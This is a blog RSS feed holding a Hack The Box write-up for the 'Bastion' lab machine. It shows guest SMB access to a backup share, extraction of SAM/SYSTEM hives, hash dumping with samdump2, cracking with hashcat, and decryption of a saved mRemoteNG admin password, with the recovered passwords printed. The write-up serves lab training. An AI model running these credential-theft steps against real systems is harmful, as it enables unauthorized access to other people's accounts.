<?xml version="1.0" encoding="utf-8" standalone="yes"?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
  <channel>
    <title>SAM on ikuamike</title>
    <link>https://blog.ikuamike.io/tags/sam/</link>
    <description>Recent content in SAM on ikuamike</description>
    <generator>Hugo -- gohugo.io</generator>
    <language>en-us</language>
    <copyright>Â© Michael Ikua</copyright>
    <lastBuildDate>Fri, 06 Sep 2019 00:00:00 +0000</lastBuildDate><atom:link href="https://blog.ikuamike.io/tags/sam/index.xml" rel="self" type="application/rss+xml" />
    <item>
      <title>Hack The Box: Bastion</title>
      <link>https://blog.ikuamike.io/posts/2019/bastion-htb/</link>
      <pubDate>Fri, 06 Sep 2019 00:00:00 +0000</pubDate>
      
      <guid>https://blog.ikuamike.io/posts/2019/bastion-htb/</guid>
      <description></description>
      <content>&lt;img src=&#34;https://blog.ikuamike.io/img/bastion/info_card.png&#34;  alt=&#34;Bastion Info Card&#34;  class=&#34;center&#34;  style=&#34;border-radius: 8px;&#34;  /&gt;


&lt;h1 id=&#34;summary&#34;&gt;Summary&lt;/h1&gt;
&lt;p&gt;Bastion was a relatively easy box. There is an smb share is accessible without credentials and inside there is a backup drive that we can mount and access. From the drive we can dump the SAM file and crack it to get login credentials. Once logged in we find mRemoteNG installed and extract its saved passwords to get admin access.&lt;/p&gt;
&lt;h1 id=&#34;enumeration&#34;&gt;Enumeration&lt;/h1&gt;
&lt;p&gt;I start with this nmap command to quickly find open ports.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-sh&#34; data-lang=&#34;sh&#34;&gt;nmap -sS -p- --min-rate&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;1000&lt;/span&gt; 10.10.10.134

Nmap scan report &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; 10.10.10.134
Host is up &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;0.23s latency&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;.
Not shown: &lt;span style=&#34;color:#ae81ff&#34;&gt;65522&lt;/span&gt; closed ports
PORT      STATE SERVICE
22/tcp    open  ssh
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
445/tcp   open  microsoft-ds
5985/tcp  open  wsman
47001/tcp open  winrm
49664/tcp open  unknown
49665/tcp open  unknown
49666/tcp open  unknown
49667/tcp open  unknown
49668/tcp open  unknown
49669/tcp open  unknown
49670/tcp open  unknown
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Then run a thorough service scan on the discovered ports.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-sh&#34; data-lang=&#34;sh&#34;&gt;nmap -sC -sV -p 22,135,139,445,5985,47001 -oA nmap/bastion 10.10.10.134

Nmap scan report &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; 10.10.10.134
Host is up &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;0.22s latency&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;.

PORT      STATE SERVICE      VERSION
22/tcp    open  ssh          OpenSSH for_Windows_7.9 &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;protocol 2.0&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
| ssh-hostkey:
|   &lt;span style=&#34;color:#ae81ff&#34;&gt;2048&lt;/span&gt; 3a:56:ae:75:3c:78:0e:c8:56:4d:cb:1c:22:bf:45:8a &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;RSA&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
|   &lt;span style=&#34;color:#ae81ff&#34;&gt;256&lt;/span&gt; cc:2e:56ðŸ†Ž19:97:d5:bb:03:fb:82ðŸ’¿63:da:68:01 &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;ECDSA&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
|_  &lt;span style=&#34;color:#ae81ff&#34;&gt;256&lt;/span&gt; 93:5f:5d:aa:ca:9f:53:e7:f2:82:e6:64:a8:a3:a0:18 &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;ED25519&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
135/tcp   open  msrpc        Microsoft Windows RPC
139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds Windows Server &lt;span style=&#34;color:#ae81ff&#34;&gt;2016&lt;/span&gt; Standard &lt;span style=&#34;color:#ae81ff&#34;&gt;14393&lt;/span&gt; microsoft-ds
5985/tcp  open  http         Microsoft HTTPAPI httpd 2.0 &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;SSDP/UPnP&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
47001/tcp open  http         Microsoft HTTPAPI httpd 2.0 &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;SSDP/UPnP&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
Service Info: OSs: Windows, Windows Server &lt;span style=&#34;color:#ae81ff&#34;&gt;2008&lt;/span&gt; R2 - 2012; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: -42m39s, deviation: 1h09m15s, median: -2m40s
| smb-os-discovery:
|   OS: Windows Server &lt;span style=&#34;color:#ae81ff&#34;&gt;2016&lt;/span&gt; Standard &lt;span style=&#34;color:#ae81ff&#34;&gt;14393&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;Windows Server &lt;span style=&#34;color:#ae81ff&#34;&gt;2016&lt;/span&gt; Standard 6.3&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
|   Computer name: Bastion
|   NetBIOS computer name: BASTION&lt;span style=&#34;color:#ae81ff&#34;&gt;\x&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;00&lt;/span&gt;
|   Workgroup: WORKGROUP&lt;span style=&#34;color:#ae81ff&#34;&gt;\x&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;00&lt;/span&gt;
|_  System time: 2019-09-06T13:28:45+02:00
| smb-security-mode:
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;dangerous, but default&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
| smb2-security-mode:
|   2.02:
|_    Message signing enabled but not required
| smb2-time:
|   date: 2019-09-06 12:28:49
|_  start_date: 2019-09-06 11:58:13

&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;smb&#34;&gt;SMB&lt;/h2&gt;
&lt;p&gt;Based on the open ports the best service to check out first is smb.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-sh&#34; data-lang=&#34;sh&#34;&gt;smbmap -H 10.10.10.134 -u &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39; &amp;#39;&lt;/span&gt;

&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;+&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; Finding open SMB ports....
&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;+&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; Guest SMB session established on 10.10.10.134...
&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;+&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; IP: 10.10.10.134:445        Name: 10.10.10.134
        Disk                                                    Permissions
        ----                                                    -----------
        ADMIN$                                                  NO ACCESS
        Backups                                                 READ, WRITE
        C$                                                      NO ACCESS
        IPC$                                                    READ ONLY
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;After running smbmap, I discover a share called Backups that I have read and write permissions as a guest user.&lt;/p&gt;
&lt;p&gt;Since this is a windows machine I will switch to my windows vm to make my work easier.&lt;/p&gt;

  &lt;img src=&#34;https://blog.ikuamike.io/img/bastion/backup_share.png&#34;  alt=&#34;backup share&#34;  class=&#34;center&#34;  style=&#34;border-radius: 8px;&#34;  /&gt;


&lt;!-- raw HTML omitted --&gt;
&lt;p&gt;Contents of note.txt&lt;/p&gt;
&lt;p&gt;&lt;em&gt;Sysadmins: please don&amp;rsquo;t transfer the entire backup file locally, the VPN to the subsidiary office is too slow.&lt;/em&gt;&lt;/p&gt;
&lt;p&gt;Going deeper into the WindowsImageBackup folder I found a backup image which is quite big. Downloading the whole file would not be an option as the note.txt suggested. Fortunately I can mount it through the share remotely, this is the reason why I wanted to use a windows vm.&lt;/p&gt;

  &lt;img src=&#34;https://blog.ikuamike.io/img/bastion/backup_share_2.png&#34;  alt=&#34;backup share&#34;  class=&#34;center&#34;  style=&#34;border-radius: 8px;&#34;  /&gt;


&lt;!-- raw HTML omitted --&gt;
&lt;p&gt;On mounting it, it appears as Local Disk (D:). After accessing the home directory of user L4mpje and looking through the folders there was no user.txt, it must have been excluded from the backup.&lt;/p&gt;

  &lt;img src=&#34;https://blog.ikuamike.io/img/bastion/backup_share_3.png&#34;  alt=&#34;backup share&#34;  class=&#34;center&#34;  style=&#34;border-radius: 8px;&#34;  /&gt;


&lt;p&gt;At this stage I was stuck for a while (I still suck at owning windows) and after some hints in the forum I figured I should look at where credentials are stored locally on windows and how to get them. Simply the equivalent of /etc/shadow or /etc/passwd on linux.&lt;/p&gt;
&lt;p&gt;I learnt that I should be looking in C:\windows\system32\config for the SAM and SYSTEM files which I found.&lt;/p&gt;

  &lt;img src=&#34;https://blog.ikuamike.io/img/bastion/backup_share_4.png&#34;  alt=&#34;backup share&#34;  class=&#34;center&#34;  style=&#34;border-radius: 8px;&#34;  /&gt;


&lt;h5 id=&#34;now-to-get-the-credentials&#34;&gt;Now to get the credentials!&lt;/h5&gt;
&lt;p&gt;I pulled the 2 files back to my kali box and using samdump2 I got the user hash.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-sh&#34; data-lang=&#34;sh&#34;&gt;samdump2 SYSTEM SAM

*disabled* Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
*disabled* Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
L4mpje:1000:aad3b435b51404eeaad3b435b51404ee:26112010952d963c8dc4217daec986d9:::
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;I then cracked the NTLM hash for L4mpje using hashcat and got the password.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-sh&#34; data-lang=&#34;sh&#34;&gt;hashcat -m &lt;span style=&#34;color:#ae81ff&#34;&gt;1000&lt;/span&gt; -a &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt; 26112010952d963c8dc4217daec986d9 /usr/share/wordlists/rockyou.txt --force

26112010952d963c8dc4217daec986d9:bureaulampje
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h1 id=&#34;exploitation&#34;&gt;Exploitation&lt;/h1&gt;
&lt;p&gt;Now that I have a username and password I can login through ssh.&lt;/p&gt;

  &lt;img src=&#34;https://blog.ikuamike.io/img/bastion/bastion_5.png&#34;  alt=&#34;backup share&#34;  class=&#34;center&#34;  style=&#34;border-radius: 8px;&#34;  /&gt;


&lt;p&gt;Now that user is owned, let&amp;rsquo;s try to escalate privileges to admin.&lt;/p&gt;
&lt;p&gt;I switched to powershell and started looking at installed programs. mRemoteNG isn&amp;rsquo;t a default windows application so let me look into it and if it can help in privesc.&lt;/p&gt;

  &lt;img src=&#34;https://blog.ikuamike.io/img/bastion/bastion_6.png&#34;  alt=&#34;backup share&#34;  class=&#34;center&#34;  style=&#34;border-radius: 8px;&#34;  /&gt;


&lt;!-- raw HTML omitted --&gt;
&lt;p&gt;According to their website:&lt;/p&gt;
&lt;p&gt;&lt;em&gt;mRemoteNG is a fork of mRemote: an open source, tabbed, multi-protocol, remote connections manager.&lt;/em&gt;&lt;/p&gt;
&lt;p&gt;I found a metasploit module that claims to extract saved passwords from mRemoteNG. Since I am logged in I don&amp;rsquo;t need metasploit so I looked at the source to see how it extracts the passwords and decrypts them.&lt;/p&gt;
&lt;p&gt;The saved passwords are located in AppData in mRemoteNG\confCons.xml. Once I found the file the admin password was there but encrypted.&lt;/p&gt;

  &lt;img src=&#34;https://blog.ikuamike.io/img/bastion/bastion_7.png&#34;  alt=&#34;backup share&#34;  class=&#34;center&#34;  style=&#34;border-radius: 8px;&#34;  /&gt;


&lt;p&gt;I was able to find a script on github to decrypt the password.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-sh&#34; data-lang=&#34;sh&#34;&gt;./mremoteng_decrypt.py -s aEWNFV5uGcjUHF0uS17QTdT9kVqtKCPeoC0Nw5dmaPFjNQ2kt/zO5xDqE4HdVmHAowVRdC7emf7lWWA10dQKiw&lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt;

Password: thXLHM96BeKL0ER2
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;I can finally login as administrator and own system!&lt;/p&gt;

  &lt;img src=&#34;https://blog.ikuamike.io/img/bastion/bastion_8.png&#34;  alt=&#34;backup share&#34;  class=&#34;center&#34;  style=&#34;border-radius: 8px;&#34;  /&gt;


&lt;h1 id=&#34;references&#34;&gt;References&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href=&#34;https://github.com/haseebT/mRemoteNG-Decrypt/blob/master/mremoteng_decrypt.py&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;mremoteng_decrypt.py&lt;/a&gt;

&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;https://vulners.com/metasploit/MSF:POST/WINDOWS/GATHER/CREDENTIALS/MREMOTE/&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;mremote metasploit module&lt;/a&gt;

&lt;/li&gt;
&lt;/ul&gt;</content>
    </item>
    
  </channel>
</rss>
